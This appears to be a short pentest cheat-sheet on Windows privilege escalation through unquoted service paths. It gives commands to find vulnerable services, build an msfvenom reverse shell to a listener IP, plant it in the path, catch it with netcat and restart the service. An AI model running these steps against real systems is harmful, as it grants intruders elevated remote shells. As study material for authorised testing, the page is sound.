---
title: unquoted service path
category: win privesc
order: 1
---
---
[WPE-08 - Unquoted Service Path](https://pentestlab.blog/2017/03/09/unquoted-service-path/)

We can use this attack when we have write
permissions to a service’s main directory and subdirectories but cannot replace files within them.

if we have this path unquoted:
```
C:\Program Files\My Program\My Service\service.exe
```
windows will try to run  in order:
```
C:\Program.exe
C:\Program Files\My.exe
C:\Program Files\My Program\My.exe
C:\Program Files\My Program\My service\service.exe
```
&nbsp;
## | 1 find vulnerable services
```
wmic service get name,displayname,pathname,startmode
```
or
```
wmic service get name,displayname,pathname,startmode |findstr /i “auto” |findstr /i /v “c:\windows\\” |findstr /i /v “””
```
ex:
```
 C:\Program Files (x86)\Sync Breeze Enterprise\bin\syncbrs.exe  
 ```
 &nbsp;
## | 2 create reverse shell
```
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.100.220 LPORT=4445 -f exe -o shell2.exe
```
&nbsp;
## | 3 Rename and move binary
```
C:\Program Files (x86)\Sync.exe
```
&nbsp;
## | 4 open listener
```
nc -nlvp 4445
```
&nbsp;
## | 5 restart service
```
net stop "Sync Breeze Enterprise"
net start "Sync Breeze Enterprise"
```
